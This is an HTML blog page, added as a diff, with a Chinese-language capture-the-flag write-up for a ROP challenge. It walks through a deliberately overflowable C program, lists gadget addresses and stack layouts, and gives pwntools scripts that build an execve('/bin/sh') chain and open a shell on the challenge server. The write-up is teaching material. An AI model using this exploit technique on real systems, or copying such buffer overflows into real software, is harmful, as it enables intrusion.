@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<!--Description-->
+
+
+
+    <meta name="description" content="ROP-EZROP(b33f adv_pwn)
+Author:堇姬
+
+確認保護
+
+開NX沒辦法寫shellcode，另外他開了canary，但其實沒開(沒有check canary的判斷式)
+
+
+如果有開會有這個
+
+
+
+source coderead的buffer overflow一樣給好給滿
+12"/>
+
+
+<!--Author-->
+
+    <meta name="author" content="Naup堇姬"/>
+
+
+<!--Open Graph Title-->
+
+    <meta property="og:title" content="ROP-EZROP(b33f adv_pwn)"/>
+
+
+<!--Open Graph Description-->
+
+    <meta property="og:description" content="ROP-EZROP(b33f adv_pwn)
+Author:堇姬
+
+確認保護
+
+開NX沒辦法寫shellcode，另外他開了canary，但其實沒開(沒有check canary的判斷式)
+
+
+如果有開會有這個
+
+
+
+source coderead的buffer overflow一樣給好給滿
+12"/>
+
+
+<!--Open Graph Site Name-->
+    <meta property="og:site_name" content="堇姬 Naup&#39;s Blog"/>
+
+<!--Type page-->
+
+    <meta property="og:type" content="article"/>
+
+
+<!--Page Cover-->
+
+
+    <meta property="og:image" content="http://example.com/img/bg2.jpg"/>
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+
+
+
+
+    <meta name="twitter:image" content="http://example.com/img/bg2.jpg"/>
+
+
+<!-- Title -->
+
+<title>ROP-EZROP(b33f adv_pwn) | 堇姬 Naup&#39;s Blog</title>
+
+<!-- Bootstrap Core CSS -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+
+<!-- Custom CSS -->
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<!-- Custom Fonts -->
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+
+<!-- Gallery -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">
+
+<!-- favicon -->
+
+<link rel="icon" href="/img/icon.jpg"/>
+
+
+
+    <!-- Google Analytics -->
+    
+
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+<!-- Head tag -->
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
+    <div class="container pl-0 pr-0">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <a class="navbar-brand text-white p-1 pl-3" href="/">堇姬 Naup's Blog</a>
+        </div>
+        <div class="navbar-nav float-right">
+            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
+                <i class="fas fa-search"></i>
+            </button>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/bg2.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12 text-center">
+                <div class="post-heading text-white">
+                    <h1>ROP-EZROP(b33f adv_pwn)</h1>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+                
+                    <span class="meta d-inline-block">
+    
+    
+    <!-- Date -->
+    
+        <span class="post-meta-split">&nbsp;|&nbsp;</span>
+        <i class="far fa-calendar-check fa-fw"></i>
+        2024-05-17
+    
+    <!-- word count and read count -->
+    
+
+    
+
+    
+</span>  
+                
+                <h1 id="ROP-EZROP-b33f-adv-pwn"><a href="#ROP-EZROP-b33f-adv-pwn" class="headerlink" title="ROP-EZROP(b33f adv_pwn)"></a>ROP-EZROP(b33f adv_pwn)</h1><blockquote>
+<p>Author:堇姬</p>
+</blockquote>
+<h2 id="確認保護"><a href="#確認保護" class="headerlink" title="確認保護"></a>確認保護</h2><div class="img-item" data-src="/2024/05/17/ROP-EZROP/checksec.png" data-sub-html=".caption"><img src="/2024/05/17/ROP-EZROP/checksec.png" class=""></div>
+
+<p>開NX沒辦法寫shellcode，另外他開了canary，但其實沒開(沒有check canary的判斷式)</p>
+<div class="img-item" data-src="/2024/05/17/ROP-EZROP/NOCANARY.png" data-sub-html=".caption"><img src="/2024/05/17/ROP-EZROP/NOCANARY.png" class=""></div>
+
+<p>如果有開會有這個</p>
+<div class="img-item" data-src="/2024/05/17/ROP-EZROP/NOCANARYdemo.png" data-sub-html=".caption"><img src="/2024/05/17/ROP-EZROP/NOCANARYdemo.png" class=""></div>
+
+
+<h2 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h2><p>read的buffer overflow一樣給好給滿</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>];</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Give me your overflow: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x400</span>); <span class="comment">// oops!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>基本上應該是要直接堆ROP</p>
+<p>所以我們看看堆出execve需要甚麼吧</p>
+<ul>
+<li>execve(‘&#x2F;bin&#x2F;sh’)</li>
+</ul>
+<div class="table-responsive">
+<table class="table table-bordered table-striped">
+<thead>
+<tr>
+<th>暫存器</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>rax</td>
+<td>0x3b</td>
+</tr>
+<tr>
+<td>rdi</td>
+<td>要執行的參數值(&#x2F;bin&#x2F;sh)</td>
+</tr>
+<tr>
+<td>rsi</td>
+<td>argv(這裡&#x3D;0)</td>
+</tr>
+<tr>
+<td>rdx</td>
+<td>envp(這裡&#x3D;0)</td>
+</tr>
+</tbody></table>
+<p>先找看看有沒有pop register;ret之類的可以控這些register</p>
+<p>ROPgadget找位置</p>
+<div class="table-responsive">
+<table class="table table-bordered table-striped">
+<thead>
+<tr>
+<th>暫存器</th>
+<th>位置</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>pop rax ;ret</td>
+<td>0x44fd07</td>
+</tr>
+<tr>
+<td>pop rdi ;ret</td>
+<td>0x401e9f</td>
+</tr>
+<tr>
+<td>pop rsi ;ret</td>
+<td>0x409f0e</td>
+</tr>
+<tr>
+<td>pop rdx ; pop rbx ; ret</td>
+<td>0x485a8b</td>
+</tr>
+<tr>
+<td>syscall</td>
+<td>0x401c54</td>
+</tr>
+</tbody></table>
+<p>目前發現所有register都是可控的<br>但是我們必須找到一段可以寫入<code>/bin/sh</code>的地方，所以我們可以嘗試用這種gadget</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov QWORD PTR [register1], register2;ret</span><br></pre></td></tr></table></figure>
+<p>他會把<code>register2</code>的值寫入到<code>register1</code>所存值得記憶體位置</p>
+<div class="table-responsive">
+<table class="table table-bordered table-striped">
+<thead>
+<tr>
+<th>暫存器</th>
+<th>位置</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>mov qword ptr [rsi], rdx ; ret</td>
+<td>0x487e8a</td>
+</tr>
+</tbody></table>
+<p>目前看到data段0x4c5000~0x4c8000可寫，所以嘗試去找看起來沒用到的memory</p>
+<div class="img-item" data-src="/2024/05/17/ROP-EZROP/vmmap.png" data-sub-html=".caption"><img src="/2024/05/17/ROP-EZROP/vmmap.png" class=""></div>
+
+<p><code>0x4c50e0</code>看起來沒東西，嘗試寫到那。</p>
+<div class="img-item" data-src="/2024/05/17/ROP-EZROP/memorycanwbinsh.png" data-sub-html=".caption"><img src="/2024/05/17/ROP-EZROP/memorycanwbinsh.png" class=""></div>
+
+<p>stack狀況</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">AAAAAA(0x48個蓋buf跟old rbp)</span><br><span class="line">pop rdx ; pop rbx</span><br><span class="line">/bin/sh\x00</span><br><span class="line">0</span><br><span class="line">pop rsi</span><br><span class="line">0x4c50e0</span><br><span class="line">mov qword ptr [rsi], rdx ; ret</span><br></pre></td></tr></table></figure>
+
+<p>目前狀況run起來用gdb下b在main最後的ret看看</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">tst=<span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> tst==<span class="number">1</span>:</span><br><span class="line">    r=remote(<span class="string">&#x27;chall.nckuctf.org&#x27;</span>, <span class="number">10007</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r=process(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_binsh=&#123;</span><br><span class="line">    <span class="string">&quot;pop_rdx_addr&quot;</span>:<span class="number">0x485a8b</span>,</span><br><span class="line">    <span class="string">&quot;pop_rdx_value&quot;</span>:<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;pop_rbx_value&quot;</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;pop_rsi_addr&quot;</span>:<span class="number">0x409f0e</span>,</span><br><span class="line">    <span class="string">&quot;pop_rsi_value&quot;</span>:<span class="number">0x4c50e0</span>,</span><br><span class="line">    <span class="string">&quot;mov&quot;</span>:<span class="number">0x487e8a</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">writebinsh_payload=flat(write_binsh[<span class="string">&quot;pop_rdx_addr&quot;</span>],</span><br><span class="line">                        write_binsh[<span class="string">&quot;pop_rdx_value&quot;</span>],</span><br><span class="line">                        write_binsh[<span class="string">&quot;pop_rbx_value&quot;</span>],</span><br><span class="line">                        write_binsh[<span class="string">&quot;pop_rsi_addr&quot;</span>],</span><br><span class="line">                        write_binsh[<span class="string">&#x27;pop_rsi_value&#x27;</span>],</span><br><span class="line">                        write_binsh[<span class="string">&quot;mov&quot;</span>]                       </span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">gdb.attach(r,<span class="string">&quot;b *0x00000000004017f2&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Give me your overflow: &#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+writebinsh_payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>已經成功把<code>/bin/sh</code>寫到<code>0x4c50e0</code></p>
+<div class="img-item" data-src="/2024/05/17/ROP-EZROP/gdb.png" data-sub-html=".caption"><img src="/2024/05/17/ROP-EZROP/gdb.png" class=""></div>
+
+<p>接下來開始堆參數</p>
+<div class="table-responsive">
+<table class="table table-bordered table-striped">
+<thead>
+<tr>
+<th>暫存器</th>
+<th>位置</th>
+<th>要蓋的值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>pop rax ;ret</td>
+<td>0x44fd07</td>
+<td>0x3b</td>
+</tr>
+<tr>
+<td>pop rdi ;ret</td>
+<td>0x401e9f</td>
+<td>0x4c50e0</td>
+</tr>
+<tr>
+<td>pop rsi ;ret</td>
+<td>0x409f0e</td>
+<td>0</td>
+</tr>
+<tr>
+<td>pop rdx ; pop rbx ; ret</td>
+<td>0x485a8b</td>
+<td>0 0</td>
+</tr>
+<tr>
+<td>syscall</td>
+<td>0x401c54</td>
+<td>無</td>
+</tr>
+</tbody></table>
+<p>stack狀況</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">AAAAAA(0x48個蓋buf跟old rbp)</span><br><span class="line">pop rdx ; pop rbx</span><br><span class="line">/bin/sh\x00</span><br><span class="line">0</span><br><span class="line">pop rsi</span><br><span class="line">0x4c50e0</span><br><span class="line">mov qword ptr [rsi], rdx ; ret</span><br><span class="line">pop rax </span><br><span class="line">0x3b</span><br><span class="line">pop rdi</span><br><span class="line">0x4c50e0</span><br><span class="line">pop rsi</span><br><span class="line">0</span><br><span class="line">pop rdx ; pop rbx </span><br><span class="line">0</span><br><span class="line">0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<p>這樣就成功堆出execve了</p>
+<h2 id="Solve-Script"><a href="#Solve-Script" class="headerlink" title="Solve Script"></a>Solve Script</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">tst=<span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> tst==<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">    r=remote(<span class="string">&#x27;chall.nckuctf.org&#x27;</span>, <span class="number">10007</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r=process(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_binsh=&#123;</span><br><span class="line">    <span class="string">&quot;pop_rdx_addr&quot;</span>:<span class="number">0x485a8b</span>,</span><br><span class="line">    <span class="string">&quot;pop_rdx_value&quot;</span>:<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;pop_rbx_value&quot;</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;pop_rsi_addr&quot;</span>:<span class="number">0x409f0e</span>,</span><br><span class="line">    <span class="string">&quot;pop_rsi_value&quot;</span>:<span class="number">0x4c50e0</span>,</span><br><span class="line">    <span class="string">&quot;mov&quot;</span>:<span class="number">0x487e8a</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">writebinsh_payload=flat(write_binsh[<span class="string">&quot;pop_rdx_addr&quot;</span>],</span><br><span class="line">                        write_binsh[<span class="string">&quot;pop_rdx_value&quot;</span>],</span><br><span class="line">                        write_binsh[<span class="string">&quot;pop_rbx_value&quot;</span>],</span><br><span class="line">                        write_binsh[<span class="string">&quot;pop_rsi_addr&quot;</span>],</span><br><span class="line">                        write_binsh[<span class="string">&#x27;pop_rsi_value&#x27;</span>],</span><br><span class="line">                        write_binsh[<span class="string">&quot;mov&quot;</span>]                       </span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">ROPvar=&#123;</span><br><span class="line">    <span class="string">&#x27;pop_rax_ret&#x27;</span>:<span class="number">0x44fd07</span>,</span><br><span class="line">    <span class="string">&#x27;pop_rdi_ret&#x27;</span>:<span class="number">0x401e9f</span>,</span><br><span class="line">    <span class="string">&#x27;pop_rsi_ret&#x27;</span>:<span class="number">0x409f0e</span>,</span><br><span class="line">    <span class="string">&#x27;pop_rdx_rbx_ret&#x27;</span>:<span class="number">0x485a8b</span>,</span><br><span class="line">    <span class="string">&#x27;syscall&#x27;</span>:<span class="number">0x401c54</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">STACKvar=&#123;</span><br><span class="line">    <span class="string">&#x27;rax_var&#x27;</span>:<span class="number">0x3b</span>,</span><br><span class="line">    <span class="string">&#x27;rdi_var&#x27;</span>:<span class="number">0x4c50e0</span>,</span><br><span class="line">    <span class="string">&#x27;rsi_var&#x27;</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;rdx_var&#x27;</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;rbx_var&#x27;</span>:<span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ROP_payload=flat(ROPvar[<span class="string">&#x27;pop_rax_ret&#x27;</span>],</span><br><span class="line">                STACKvar[<span class="string">&#x27;rax_var&#x27;</span>],</span><br><span class="line">                ROPvar[<span class="string">&#x27;pop_rdi_ret&#x27;</span>],</span><br><span class="line">                STACKvar[<span class="string">&#x27;rdi_var&#x27;</span>],</span><br><span class="line">                ROPvar[<span class="string">&#x27;pop_rsi_ret&#x27;</span>],</span><br><span class="line">                STACKvar[<span class="string">&#x27;rsi_var&#x27;</span>],</span><br><span class="line">                ROPvar[<span class="string">&#x27;pop_rdx_rbx_ret&#x27;</span>],</span><br><span class="line">                STACKvar[<span class="string">&#x27;rdx_var&#x27;</span>],</span><br><span class="line">                STACKvar[<span class="string">&#x27;rbx_var&#x27;</span>],</span><br><span class="line">                ROPvar[<span class="string">&#x27;syscall&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> tst!=<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">    gdb.attach(r,<span class="string">&quot;b *0x00000000004017f2&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Give me your overflow: &#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+writebinsh_payload+ROP_payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<div class="img-item" data-src="/2024/05/17/ROP-EZROP/getflag.png" data-sub-html=".caption"><img src="/2024/05/17/ROP-EZROP/getflag.png" class=""></div>
+
+            </div>
+
+            <!-- Post information -->
+            
+            
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+        <ul class="pagination d-block text-center">
+            
+            
+                <li class="next page-item d-inline"><a href="/2024/05/05/THJCC-office-Writeup/" class="page-link float-right">Older  &rarr;</a></li>
+            
+        </ul>
+    </div>
+
+
+            
+                <!-- Comments -->
+                
+
+                
+
+            
+
+        </div>
+    </div>
+</article> 
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    <style>
+        #toc-content .toc-link::before {
+            background-color: transparent;
+            max-height: 25px;
+        }
+
+        #toc-content .toc-link.is-active-link::before {
+            background-color: #404040;
+        }
+    </style>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
+        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
+            <i class="fas fa-list"></i>
+        </button>
+        <div class="dropdown-menu dropdown-menu-right p-2"  aria-labelledby="tocLabel">
+            <div class="toc-widget">
+                <div id="toc-content" class="text-truncate">
+                </div>
+            </div>
+            <div class="toc-menu pt-3 pl-4">
+                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">Expand all</span><span class="close-text" style="display: none;">Collapse all</span></a>
+                <a class="back-to-top d-block py-1" href="#">Back to top</a>
+                <a class="go-to-bottom d-block py-1" href="#">Go to bottom</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        tocbot.init({
+            // Where to render the table of contents.
+            tocSelector: '#toc-content',
+            // Where to grab the headings to build the table of contents.
+            contentSelector: 'article',
+            // Which headings to grab inside of the contentSelector element.
+            headingSelector: 'h1, h2, h3',
+            // For headings inside relative or absolute positioned containers within content.
+            hasInnerContainers: true,
+        });
+    </script>
+
+
+    
+
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer id="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
+                <ul class="list-inline">
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="https://github.com/Naupjjin" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="mailto:naup96721@gmail.com" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+                <ul class="copyright footer-menu list-inline">
+                    
+                    
+                        <li class="list-inline-item">
+                            
+                            
+                            <a href="/">
+                                
+                                    Home
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/archives">
+                                
+                                    Archives
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/tags">
+                                
+                                    Tags
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/categories">
+                                
+                                    Categories
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/about">
+                                
+                                    About
+                                
+                            </a>
+                        </li>
+                    
+                </ul>
+                <p class="copyright footer-author">
+                    &copy; -2024 
+                    <a rel="external" class="copyright-link" href="" target="_blank">Naup堇姬</a><br/>
+                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
+                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
+                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
+                    
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    <!-- jQuery -->
+<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>
+
+<!-- For drop down -->
+<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
+<!-- Gallery -->
+<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
+<!-- Busuanzi -->
+
+
+<!-- Search script -->
+
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+    $(function () {
+        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
+    });
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+
+
+    <!-- Search Modal -->
+    <!-- Modal -->
+<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+        <div class="modal-content overflow-auto">
+            <div class="modal-header">
+                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body">
+                <div id="searchResult">
+                    <div class="search-empty text-center text-muted p-5">
+                        <i class="far fa-meh"></i>
+                    </div>
+                </div>
+            </div> 
+        </div>
+    </div>
+</div>
+
+
+</body>
+</html>
